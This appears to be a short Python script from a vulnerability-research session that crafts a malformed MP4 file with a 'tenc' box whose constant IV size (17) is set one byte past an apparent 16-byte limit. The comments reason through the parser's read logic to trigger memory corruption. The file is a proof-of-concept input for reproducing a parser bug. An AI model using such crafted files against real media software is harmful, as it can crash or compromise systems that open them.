import struct,json

def box(t, payload): return struct.pack('>I4s', len(payload)+8, t.encode())+payload

def fullbox(t, version, flags, payload): return box(t, bytes([version])+flags.to_bytes(3,'big')+payload)
# candidate tenc root? version 0, flags 0, reserved2, isProtected=1, iv_size=0, kid16, const_iv_size=17, data17
payload=b'\0\0\0' + b'\0' + b'\0' + b'\x01' + b'\0' + b'A'*16 + bytes([17]) + b'B'*17
# Wait tenc_box_read full header size excludes version flags already read by fullbox. after full header ptr->size payload len. code decreases 3 then reads reserved(1), version reserved(1), isProtected(1), decrease17 then ivsize+KID, if !iv read size+data.
poc=box('ftyp', b'isom\0\0\0\0isom') + fullbox('tenc',0,0,payload)
open('/workspace/poc_tenc_root.mp4','wb').write(poc)
print(len(poc), poc.hex())
PY
